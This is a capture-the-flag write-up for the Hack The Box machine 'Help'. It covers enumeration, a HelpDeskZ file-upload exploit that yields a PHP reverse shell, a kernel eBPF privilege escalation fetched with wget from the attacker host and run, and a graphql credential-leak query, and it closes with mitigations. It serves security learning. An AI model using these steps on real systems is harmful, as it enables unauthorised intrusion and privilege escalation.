# Help

```
kali@kali:~/htb/Help$ sudo nmap -p- -sC -sV 10.129.42.250
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-08 08:22 EST
Nmap scan report for 10.129.42.250
Host is up (0.029s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.78 seconds
kali@kali:~/htb/Help$ 
```

The port 80 webserver is just a default apache2 Ubuntu page.

The 3000 webserver is a nodejs server, and gives this message: 	"Hi Shiv, To get access please find the credentials with given query"


Running wfuzz on the port 80 reveals that /support/ works:

```
kali@kali:~/htb/Help$ sudo wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.42.250/FUZZ
[sudo] password for kali: 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.42.250/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000001:   200        375 L    968 W      11321 Ch    "# directory-list-2.3-medium.txt"                                                          
000000003:   200        375 L    968 W      11321 Ch    "# Copyright 2007 James Fisher"                                                            
000000007:   200        375 L    968 W      11321 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                          
000000014:   200        375 L    968 W      11321 Ch    "http://10.129.42.250/"                                                                    
000000013:   200        375 L    968 W      11321 Ch    "#"                                                                                        
000000012:   200        375 L    968 W      11321 Ch    "# on atleast 2 different hosts"                                                           
000000011:   200        375 L    968 W      11321 Ch    "# Priority ordered case sensative list, where entries were found"                         
000000009:   200        375 L    968 W      11321 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                      
000000010:   200        375 L    968 W      11321 Ch    "#"                                                                                        
000000006:   200        375 L    968 W      11321 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                            
000000008:   200        375 L    968 W      11321 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                               
000000005:   200        375 L    968 W      11321 Ch    "# This work is licensed under the Creative Commons"                                       
000000002:   200        375 L    968 W      11321 Ch    "#"                                                                                        
000000004:   200        375 L    968 W      11321 Ch    "#"                                                                                        
000000055:   200        96 L     236 W      4413 Ch     "support"                                                                                  
000001073:   403        11 L     32 W       299 Ch      "javascript"                                                                               
000045240:   200        375 L    968 W      11321 Ch    "http://10.129.42.250/"                                                                    
000095524:   403        11 L     32 W       301 Ch      "server-status"                                                                            

Total time: 0
Processed Requests: 220560
Filtered Requests: 220542
Requests/sec.: 0
```

/support/ is a HelpDeskZ application.

a Home button redirects to "help.htb/support/" So I add it to my /etc/hosts file. 

This is a login page for HelpDeskZ. We have a possible username of "Shiv" from the nodejs site.

I run wfuzz on this address:

```
kali@kali:~/htb/Help$ sudo wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://help.htb/support/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://help.htb/support/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000001:   200        96 L     236 W      4413 Ch     "# directory-list-2.3-medium.txt"                                                          
000000007:   200        96 L     236 W      4413 Ch     "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                          
000000003:   200        96 L     236 W      4413 Ch     "# Copyright 2007 James Fisher"                                                            
000000016:   200        0 L      0 W        0 Ch        "images"                                                                                   
000000014:   200        96 L     236 W      4413 Ch     "http://help.htb/support/"                                                                 
000000010:   200        96 L     236 W      4413 Ch     "#"                                                                                        
000000009:   200        96 L     236 W      4413 Ch     "# Suite 300, San Francisco, California, 94105, USA."                                      
000000013:   200        96 L     236 W      4413 Ch     "#"                                                                                        
000000006:   200        96 L     236 W      4413 Ch     "# Attribution-Share Alike 3.0 License. To view a copy of this"                            
000000008:   200        96 L     236 W      4413 Ch     "# or send a letter to Creative Commons, 171 Second Street,"                               
000000011:   200        96 L     236 W      4413 Ch     "# Priority ordered case sensative list, where entries were found"                         
000000005:   200        96 L     236 W      4413 Ch     "# This work is licensed under the Creative Commons"                                       
000000012:   200        96 L     236 W      4413 Ch     "# on atleast 2 different hosts"                                                           
000000002:   200        96 L     236 W      4413 Ch     "#"                                                                                        
000000004:   200        96 L     236 W      4413 Ch     "#"                                                                                        
000000164:   200        375 L    968 W      11321 Ch    "uploads"                                                                                  
000000550:   200        0 L      0 W        0 Ch        "css"                                                                                      
000000638:   200        375 L    968 W      11321 Ch    "includes"                                                                                 
000000953:   200        375 L    968 W      11321 Ch    "js"                                                                                       
000003032:   200        375 L    968 W      11321 Ch    "views"                                                                                    
000045240:   200        96 L     236 W      4413 Ch     "http://help.htb/support/"                                                                 
000049217:   200        375 L    968 W      11321 Ch    "controllers"                                                                              

Total time: 0
Processed Requests: 220560
Filtered Requests: 220538
Requests/sec.: 0

kali@kali:~/htb/Help$ 
```

All of them redirect back to the apache default page. 

A searchsploit on HelpDeskZ reveals some possibilities:


```
kali@kali:~/htb/Help$ searchsploit HelpDeskZ
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HelpDeskZ 1.0.2 - Arbitrary File Upload                                                                                   | php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download                                            | php/webapps/41200.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:~/htb/Help$ 
```

The arbitrary file upload is unauthorized. And abuses the ticket system.

http://help.htb/support/?v=submit_ticket&action=displayForm Here we can upload files along with our ticket. 

I tried it out, but I got a "File is not allowed" message. So I looked for some source code, and found it here: https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/controllers/submit_ticket_controller.php

I see that the upload dir is UPLOAD_DIR.tickets/. So probably /uploads/tickets.

```
137				if(!isset($error_msg) && $settings['ticket_attachment']==1){
138					$uploaddir = UPLOAD_DIR.'tickets/';	
```

I also see that the file is uploaded, and then verified afterwards. And nothing deletes the file if the verification fails.

So the file is probably still uploaded. And as we can see on the exploit, the filename is just obfuscated a bit. But this is guessable:

```
kali@kali:~/htb/Help$ python 40300.py http://help.htb/support/uploads/tickets/ php-reverse-shell.php
Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
Sorry, I did not find anything
```

And on our listner:

```
kali@kali:~/htb/Help$ sudo nc -nlvp 1337
[sudo] password for kali: 
Listening on 0.0.0.0 1337
Connection received on 10.129.42.250 56256
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 06:27:47 up  1:08,  0 users,  load average: 0.06, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
help
$ 
```
interstingly, the help user is part of group 4(adm). The admin group.

I improve the shell with `script /dev/null -c bash` etc. And start looking.

The bash history:

```
help@help:/home/help$ cat .bash_history 
sudo mkdir lol
ls -la
cat .bash_history 
rm -rf .bash_history 
touch .bash_history
ls -la
su
su
rOOTmEoRdIE
su
MS'
exit
/
al
;
`
\
'
su
cd help
cd /help
cd  src
ls
cd graphql
ls
cd schema/
ls
cd resolvers/
ls
cat index.js 
cd
cd help
ls
npm run build
reboot
sudo shutdown
help@help:/home/help$ 
```

I find the jsnode index in /home/help/help/src/index.js


I upload pspy64 afer checking the architecture with `hostnamectl` pspy: https://github.com/DominicBreuker/pspy

I just use a python SimpleHTTPServer to upload.

But I can't find anything special.

I run `find / -perm -u=s -type f 2>/dev/null` to see if there are any suid binaries I can misuse.

Hmm. Can't find anything special.

```
help@help:/home/help$ cat /etc/issue
Ubuntu 16.04.5 LTS \n \l

help@help:/home/help$ 
```

Let's see if there's any exploit:

```
kali@kali:~/htb/Help$ searchsploit Ubuntu 16.04
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - Local Code Execution                                                          | linux/local/40937.txt
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                                                             | linux/local/40054.c
Google Chrome (Fedora 25 / Ubuntu 16.04) - 'tracker-extract' / 'gnome-video-thumbnailer' + 'totem' Drive-By Download      | linux/local/40943.txt
LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation                                                 | linux/local/41923.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwcap_64 Stack  | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Clash' Local Privilege  | linux_x86/local/42276.c
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                                                     | linux/dos/39773.txt
Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR & SMEP Bypass) Arbitrary File Read                                 | linux/local/45175.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                           | linux/local/40759.rb
Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak                                        | linux/dos/46529.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                          | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalation                   | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Escalation               | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                              | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalation                                    | linux/local/40489.txt
Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                                                | linux/dos/45919.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                             | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                    | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                         | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                     | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP) | linux/local/47169.c
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
kali@kali:~/htb/Help$ 
```

A fair few local privilege escalations here. Let's try some.

"Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                             | linux/local/45010.c"

this one seems to be in the range of the machine.

It says tested on 4.4.0-116-generic

And if we run `uname -a` on the target:

```
help@help:/home/help$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
help@help:/home/help$ 
```

It seems to be valid.

I also check that gcc is installed on the target:

```
help@help:/home/help$ which gcc
/usr/bin/gcc
help@help:/home/help$ 
```

So I set up a python webserver again, and upload/run it:

```
help@help:/home/help$ wget 10.10.14.70:8000/45010.c
--2021-02-08 06:55:38--  http://10.10.14.70:8000/45010.c
Connecting to 10.10.14.70:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13728 (13K) [text/plain]
Saving to: '45010.c'

45010.c             100%[===================>]  13.41K  --.-KB/s    in 0.03s   

2021-02-08 06:55:38 (493 KB/s) - '45010.c' saved [13728/13728]

help@help:/home/help$ gcc -o 45010 45010.c
help@help:/home/help$ ./45010 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff8800368c6600
[*] Leaking sock struct from ffff880038d45800
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880000121980
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff880000121980
[*] credentials patched, launching shell...
# whoami
root
# 
```

I should probably starty checking for possible kernel exploits earlier. As just aimlessly looking for vulnerable binaries or similar can take a long time with no real payoff.


reference for this exploit is here: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html 

The way this exploit works is that it bypasses the bpf verifier. loads some bpf code, adn then creates a read/write primiteve. This is because of the check_alu_op() function in verifier.c which has improper arithmetic/sign-extension.


BPF information here: https://blogs.oracle.com/linux/notes-on-bpf-5



## Comparing myself with the official writeup:

They discover that /support/ is a HelpDeskZ installation.

They find the github page, and see find the changelog to reveal that the version is 1.0.2.

They then find the exploit vulnerabilities.

They also show how to exploit the nodejs server. I'm very unexperienced with nodejs, so this will be a nice learning experience.

```
A graphql endpoint takes in objects as input. As we need
information related to a user lets try a user object,
```

They use curl to send and recieve information:

```
curl -s -G http://10.10.10.121:3000/graphql --data-urlencode
'query={user {username, password} }' | jq
```

jq is a json parser.

So we have to query the "user" object. And then get the "username" and "password" subfields.

the password can be cracked with known webpages, and then used to log into HelpDeskZ.

The other exploit is an sql injection. And also abuses the ticket system. 

The queries will either return true, in which case the attatchment loads, or false. Where it returns 404. In this way, it can bruteforced 1 by 1 character.

They then googled the kernel version and found an exploit to gain root.


## How to stop this exploit:

Update HelpDeskZ to the newest version. or edit the file verifier command to delete the file if the file extension is disallowed. As well as fix the sql injection.

Do not have the password for the user on a nodejs graphq query.

The privesc exploit was patched by fixing the check_alu_op() function. So updating to the newest kernel will fix it.

